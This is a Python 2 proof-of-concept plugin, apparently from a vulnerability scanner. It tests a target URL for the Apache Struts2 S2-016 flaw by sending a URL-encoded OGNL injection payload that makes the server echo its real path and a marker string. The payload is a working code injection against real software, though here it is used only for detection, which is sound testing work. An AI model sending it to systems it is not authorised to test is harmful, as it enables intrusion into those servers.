#coding=utf-8
import requests
from lib import ttlscanlogger

def POC_INFO():
    dict_poc={};
    dict_poc["name"]="Struts2_016 RCE"
    dict_poc["Chinese_name"]="Struts2_016 远程命令执行漏洞"
    dict_poc["author"]="跳跳龙"
    return dict_poc

def struts_016(target_url):
    try:
        poc = "?redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22/tiaotiaolong_016%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D"
        poc_url = target_url + poc

        response = requests.get(url=poc_url,timeout=0.5)
        result = response.text.encode('utf-8')
        # print result
        if 'tiaotiaolong_016' in result:
            # print "发现一处struts漏洞，漏洞类型：struts2-016。漏洞地址为" + target_url
            ttlscanlogger.logger.error("[+]Vuln: {0} has found Struts2_016 vulnerabillity ".format(target_url))
            return True
        # print result
        else:
            # print "此处尚未发现struts2-016类型漏洞"
            return False
    except Exception, e:
        return False